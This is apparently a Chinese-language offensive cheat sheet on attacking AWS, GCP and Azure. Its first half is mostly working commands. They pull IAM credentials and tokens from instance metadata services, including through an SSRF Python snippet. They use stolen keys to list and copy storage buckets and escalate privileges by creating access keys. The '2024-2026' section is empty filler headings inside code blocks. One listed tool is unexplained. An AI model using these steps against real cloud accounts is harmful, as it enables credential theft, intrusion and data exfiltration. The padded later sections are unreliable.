# 云服务攻击 (Cloud Services Attacks)

## 原理

攻击 AWS/GCP/Azure 等云服务的配置错误、IAM 权限过大、元数据服务、Serverless 函数等。

## 攻击链

### 1. AWS 攻击

#### 元数据服务

```bash
# IMDSv1（旧版，直接访问）
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/
# 返回 AccessKeyId, SecretAccessKey, Token

# IMDSv2（新版，需要 Token）
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# 用户数据
curl http://169.254.169.254/latest/user-data
```

#### 使用凭证

```bash
# 配置 AWS CLI
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>

# 列出 S3
aws s3 ls
aws s3 ls s3://bucket-name

# 列出 EC2
aws ec2 describe-instances

# 列出 IAM
aws iam list-users
aws iam list-roles
aws iam get-role --role-name <role>

# 列出 Lambda
aws lambda list-functions
```

#### S3 攻击

```bash
# 列出 bucket
aws s3 ls s3://bucket-name --no-sign-request  # 匿名访问

# 上传文件
aws s3 cp file.txt s3://bucket-name/

# 下载文件
aws s3 cp s3://bucket-name/file.txt ./
```

#### Lambda 攻击

```bash
# 列出函数
aws lambda list-functions

# 获取函数代码
aws lambda get-function --function-name <name>

# 调用函数
aws lambda invoke --function-name <name> output.txt

# 注入恶意代码
# 修改 Lambda 函数代码
```

#### IAM 提权

```bash
# 常见提权路径
# 1. iam:CreateAccessKey - 为其他用户创建密钥
# 2. iam:AttachRolePolicy - 给角色附加管理员策略
# 3. iam:PutRolePolicy - 修改角色策略
# 4. lambda:CreateFunction + lambda:InvokeFunction - 创建恶意函数
# 5. sts:AssumeRole - 切换到高权限角色

# 列出策略
aws iam list-policies
aws iam list-attached-role-policies --role-name <role>

# 创建访问密钥
aws iam create-access-key --user-name <user>
```

### 2. GCP 攻击

#### 元数据服务

```bash
# 需要 Metadata-Flavor header
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# 获取 token
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# 获取项目信息
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/

# 获取实例信息
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
```

#### 使用凭证

```bash
# 配置 gcloud
gcloud auth login
gcloud config set project <project-id>

# 列出 Compute Engine
gcloud compute instances list

# 列出 Storage
gsutil ls
gsutil ls gs://bucket-name

# 列出 Cloud Functions
gcloud functions list
```

#### Cloud Storage 攻击

```bash
# 列出 bucket
gsutil ls gs://bucket-name

# 上传文件
gsutil cp file.txt gs://bucket-name/

# 下载文件
gsutil cp gs://bucket-name/file.txt ./
```

#### Cloud Functions 攻击

```bash
# 列出函数
gcloud functions list

# 获取函数代码
gcloud functions describe <function-name>

# 调用函数
gcloud functions call <function-name>
```

### 3. Azure 攻击

#### 元数据服务

```bash
# 需要 Metadata header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 获取 token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

#### 使用凭证

```bash
# 配置 az
az login
az account set --subscription <subscription-id>

# 列出 VM
az vm list

# 列出 Storage
az storage account list
```

### 4. SSRF 到云服务

```python
# 通过 SSRF 访问元数据服务
import requests

# AWS
r = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/')
print(r.json())

# GCP
r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 
                 headers={'Metadata-Flavor': 'Google'})
print(r.json())

# Azure
r = requests.get('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
                 headers={'Metadata': 'true'})
print(r.json())
```

### 5. Serverless 攻击

#### AWS Lambda

```bash
# Lambda 注入
# 通过 API Gateway 触发 Lambda
# 注入恶意代码

# 环境变量泄露
# Lambda 环境变量可能包含敏感信息
```

#### GCP Cloud Functions

```bash
# 类似 Lambda
# 通过 HTTP 触发
# 注入恶意代码
```

### 6. 容器服务攻击

#### AWS ECS

```bash
# ECS 任务定义
# 可能包含敏感信息
aws ecs describe-task-definition --task-definition <name>
```

#### AWS EKS

```bash
# EKS 是 AWS 的 K8s 服务
# 结合 K8s 攻击和 AWS 攻击
```

### 7. 数据库服务攻击

#### AWS RDS

```bash
# RDS 数据库
# 可能包含敏感信息
aws rds describe-db-instances
aws rds describe-db-snapshots
```

#### AWS DynamoDB

```bash
# DynamoDB 表
aws dynamodb list-tables
aws dynamodb scan --table-name <table-name>
```

## 2024-2026 新技术点

### 1. IMDSv2 绕过

```bash
# IMDSv2 需要 Token
# 但某些 SSRF 可以绕过
# 1. 通过 PUT 方法获取 Token
# 2. 通过 SSRF 注入 header
```

### 2. Serverless 新攻击

```bash
# AWS Lambda
# GCP Cloud Functions
# Azure Functions
# 各 Serverless 平台的新攻击
```

### 3. AI 服务攻击

```bash
# AWS SageMaker
# GCP Vertex AI
# Azure ML
# 各 AI 服务的攻击
```

### 4. 边缘计算攻击

```bash
# Cloudflare Workers
# AWS CloudFront Functions
# 各边缘计算平台的攻击
```

### 5. 多云攻击

```bash
# 跨云权限提升
# 跨云数据泄露
# 各多云攻击
```

### 6. 零信任云

```bash
# 零信任架构
# 新的攻击方法
```

### 7. 量子云

```bash
# 量子计算服务
# 新的攻击面
```

### 8. 区块链云

```bash
# 区块链即服务
# 新的攻击面
```

### 9. 容器云新攻击

```bash
# AWS ECS
# GCP Cloud Run
# Azure Container Apps
# 各容器云的新攻击
```

### 10. AI 辅助检测

```python
# ML 辅助
# 自动检测云配置错误
# 模式识别
```

## 工具推荐

- **awscli** — AWS CLI
- **gcloud** — GCP CLI
- **az** — Azure CLI
- **Prowler** — AWS 安全审计
- **ScoutSuite** — 多云审计
- **CloudSploit** — 云安全扫描
- **LolrusLove** — 云提权工具

## 参考链接

- [Cloud Security](https://book.hacktricks.xyz/cloud-security)
- [Prowler](https://github.com/prowler-cloud/prowler)
- [ScoutSuite](https://github.com/nccgroup/ScoutSuite)
- [AWS Security](https://aws.amazon.com/security/)
